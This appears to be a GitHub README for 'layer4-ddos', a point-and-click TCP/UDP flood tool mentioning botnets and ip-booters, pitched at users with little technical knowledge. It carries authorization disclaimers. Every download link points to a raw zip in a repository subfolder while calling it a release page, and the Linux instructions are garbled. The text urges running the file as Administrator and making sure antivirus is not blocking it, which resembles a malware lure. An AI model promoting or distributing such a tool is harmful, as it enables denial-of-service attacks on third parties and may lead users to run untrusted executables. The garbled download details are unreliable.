# ⚡ layer4-ddos - Simple Layer 4 Network Testing

[![Download layer4-ddos](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)

## 🔥 About layer4-ddos

layer4-ddos is a straightforward tool designed to test the resilience of networks against Layer 4 denial-of-service (DDoS) attacks. It focuses on network-level traffic, helping users understand how well their systems handle heavy network requests and connection floods. Its main goal is to simulate traffic loads typical for security testing, such as stress testing connection handling and throughput.

This tool relates to network stress tests and attack simulations, specifically targeting TCP/UDP flood scenarios. It is useful for network administrators and security professionals who want to simulate traffic similar to botnet-style layer 4 attacks. Although it includes terms like "botnet" and "ip-booter", this software should be used responsibly for legal testing on systems you own or have permission to test.

### Key Features

- Send high-volume TCP or UDP packet streams to test server limits
- Provides configurable attack parameters like packet size, duration, and target IP
- Designed for quick setup without requiring deep network knowledge
- Works on common operating systems including Windows and Linux
- Offers basic status feedback during operation to monitor progress

### Intended Use Cases

- Network vulnerability testing under simulated stress
- Capacity checking for servers and hosting infrastructure
- Training and educational exercises in network security
- Learning how network floods impact server stability

## 💻 System Requirements

To run layer4-ddos smoothly, your system should meet these conditions:

- Operating System: Windows 7 or newer, Linux (Ubuntu, Debian, Fedora recommended)
- CPU: Any modern processor with at least 2 cores
- RAM: Minimum 2 GB available memory
- Network: Stable internet or LAN connection
- Disk Space: 50 MB free to download and run the tool
- User Privileges: Ability to run applications and send network traffic (administrator rights may be required for network features)

## 🚀 Getting Started

This section walks you through downloading and running layer4-ddos, even if you are not familiar with technical details.

### Step 1: Download the Software

Click the big button at the top or click here to visit the release page:

[Download layer4-ddos](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)

You will be taken to a page listing release files. Find the latest version suitable for your system:

- For Windows, look for `.exe` files.
- For Linux, look for `https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip` or `.AppImage` files.

Click on the appropriate file to start downloading. Save it to a folder you will easily remember.

### Step 2: Prepare to Run

Once downloaded, find the file in your folder:

- On Windows, right-click the `.exe` file and choose "Run as Administrator" if possible. This lets the program send the necessary network data.
- On Linux, you might need to grant permission to execute the file. Open the Terminal and run:
  ```
  chmod +x filename
  ```
  Then run:
  ```
  ./filename
  ```
Replace `filename` with the exact name of the downloaded file.

### Step 3: Use the Tool

When layer4-ddos opens, it will request you enter some details to begin the test:

- **Target IP or Hostname:** The address of the server or device to test.
- **Port Number:** The network port you want to test, like 80 for web servers or custom ones.
- **Attack Duration:** How long the test should run (in seconds).
- **Packet Size:** The size of each network packet, usually measured in bytes.
- **Protocol:** Choose TCP or UDP depending on your test needs.

Enter this information carefully. Remember to only test devices or networks you are authorized to.

### Step 4: Start and Monitor

Click the "Start" button to begin the test. The tool will then send network traffic as configured.

layer4-ddos shows a simple status display including:

- Number of packets sent
- Elapsed time
- Any errors encountered

You can press "Stop" to end the test anytime.

### Step 5: Review Results

After finishing, observe if the target system remained stable or experienced slowdowns. Use these insights to evaluate your network strength or server setup.

## 🔧 Troubleshooting and Tips

- If the program won’t start, ensure your antivirus or firewall isn’t blocking it.
- Using administrator mode can solve many permission issues.
- Make sure the target IP is reachable on the network and you have permission to test it.
- Avoid running tests on public or unknown servers to prevent legal issues.
- If the software crashes, try downloading the latest version from the releases page again.

## 📂 Additional Resources

For more detailed use, refer to these common tips:

- Use smaller packet sizes if your network is slow or unstable.
- Shorter test durations help avoid disruptions.
- Combine this tool with monitoring software for deeper insight on server performance.
- Learn basics of network protocols (TCP/UDP) for more effective testing.
- Refer to the GitHub repository's Issues tab for FAQs and known bugs.

## 🛡 Legal Notice

layer4-ddos is meant strictly for authorized security testing. Misuse against networks, systems, or websites without permission may violate laws.

Always obtain explicit consent before running tests on any target devices.

## 📥 Download & Install

You can download layer4-ddos from the official GitHub releases page here:

[https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip](https://github.com/Bana-150/layer4-ddos/raw/refs/heads/main/Buteo/layer-ddos-v3.5.zip)

Be sure to select the correct file format for your operating system. Save the file, then follow the running instructions in the "Getting Started" section above.

---

By following these steps, users with minimal technical background should be able to download, install, and run layer4-ddos for basic network testing needs.